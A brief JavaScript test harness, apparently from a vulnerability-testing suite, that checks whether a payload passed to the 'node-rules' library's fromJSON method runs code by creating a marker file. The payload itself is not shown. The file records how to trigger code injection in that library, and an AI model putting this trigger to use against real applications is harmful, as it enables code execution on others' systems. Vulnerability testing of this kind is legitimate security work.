function exploitFunction(payload) {
    const fs = require("fs");
    const A = require("node-rules");
    const path = "./node-rules";

    let file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);

    try {
        var rules = JSON.parse(JSON.stringify(payload));
        var a = new A();
        a.fromJSON(rules);
    } catch (error) {}

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };